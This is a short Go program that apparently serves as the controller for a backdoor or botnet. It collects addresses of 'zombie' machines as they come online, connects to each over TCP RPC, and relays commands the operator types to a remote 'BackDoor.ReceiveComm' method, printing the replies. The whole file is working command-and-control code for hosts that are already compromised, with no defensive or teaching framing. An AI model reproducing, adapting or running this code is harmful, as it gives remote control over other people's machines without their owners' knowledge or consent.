package main

import (
	"bufio"
	"fmt"
	"log"
	"net/rpc"
	"os"
	"zombie"
)

func main() {
	go zombie.NewServer()
	log.SetFlags(log.Llongfile)
	for {
		onlineMachine := <-zombie.OnlineMachine
		log.Println("got the online machine ", onlineMachine)
		HeaderClient, err := rpc.Dial("tcp", onlineMachine)
		if err != nil {
			log.Fatal(err)
		}
		for {
			log.Println("start to read from input")
			reader := bufio.NewReader(os.Stdin)
			fmt.Print("Enter text: ")
			text, _ := reader.ReadString('\n')
			var reply []byte
			args := new(zombie.RpcArgs)
			args.Argu = text
			//spew.Dump(&reply)
			err = HeaderClient.Call("BackDoor.ReceiveComm", args, &reply)
			if err != nil {
				log.Fatal(err)
			}
			log.Println(string(reply))
		}
	}
}
